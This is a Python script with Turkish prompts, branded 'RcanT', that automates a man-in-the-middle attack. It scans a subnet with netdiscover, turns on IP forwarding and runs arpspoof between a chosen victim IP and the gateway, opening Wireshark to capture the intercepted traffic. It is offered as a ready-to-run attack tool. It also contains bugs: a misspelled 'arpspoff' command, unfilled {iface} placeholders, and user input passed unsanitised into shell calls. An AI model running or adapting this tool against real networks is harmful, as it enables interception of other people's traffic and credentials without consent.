import os
import subprocess



def arpspoof():
	
	os.system("clear")
	
	iface = input("LÜTFEN ARAYÜZ DEĞERİNİZİ GİRİNİZ :   ÖRN: eth0    ")
	hedefip = input("LÜTFEN HEDEF IP NUMARASINI GİRİNİZ :   ÖRN: 10.0.2.8     ")
	modemip = input("LÜTFEN MODEN IP NUMARASINI GİRİNİZ :   ÖRN: 10.0.2.1     ")
	
	subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', 'apt-get install wireshark ; wireshark; exec $SHELL'])
	
	os.system("arpspoof -i"+" "+iface+" "+"-t"+" "+hedefip+" "+modemip)
	
	
	subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', 'arpspoff -i {iface} -t {modemip} {hedefip} ; exec $SHELL'])
	
	
	
	
	
	
def HedefIPogrenme():
	os.system("clear")
	os.system("figlet RcanT")
	os.system("figlet ORTADAKI ADAM SALDIRISI")

	iface = input("LÜTFEN ARAYÜZ DEĞERİNİZİ GİRİNİZ :   ÖRN: eth0    ")
	tarama = input("LÜTFEN TARANACAK IP ARALIĞI GİRİNİZ :   ÖRN: 10.0.2.0     ")

	os.system("netdiscover -i "+iface +" "+"-r"+" "+tarama+"/24"+" "+"-c"+" "+"1"+" "+"-P")
	
	deger = input("DEVAM ETMEK İÇİN \" E \" TUŞUNA BASINIZ ! ! !")
	
	if (deger == "e" or deger == "E"):
		arpspoof()	
	
	
	
	
def ortadakiadam():
	os.system("apt-get install gnome-terminal")
	os.system("apt-get install arpspoof")
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet RcanT")
	os.system("figlet ORTADAKI ADAM SALDIRISI")

	os.system("echo 1 >  /proc/sys/net/ipv4/ip_forward")   

	deger = input("HEEDEF IP NUMARA TARAMASI YAPMAK İSTİYORMUSUNUZ ?  (E/H) :    ")

	if (deger == "e" or deger == "E"):
		HedefIPogrenme()
	elif (deger == "h" or deger == "H"):
		print("ARP SPOOF ÇALIŞTIRILIYOR ! ! !")
		arpspoof()
		
	else:
		print("LÜTFEN GEÇERLİ BİR DEĞER GİRİNİZ ! ! !")




		
	
rkullanici = input("ROOT KULLANICI MISINIZ : E/H ")

if ( rkullanici == "e" or rkullanici == "E"):
	
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet RcanT")
	os.system("figlet ORTADAKI ADAM SALDIRISI")

	ortadakiadam()

elif (rkullanici == "h" or rkullanici == "H"):
	
	print("LÜTFEN ROOT KULLANICI OLDUKTAN SONRA PROGRAMI TEKRAR ÇALIŞTIRIN ! ! !")
	os.system("sudo su")
	

else:
	print("LÜTFEN GEÇERLİ BİR DEĞER GİRİNİZ !!!")







	






	
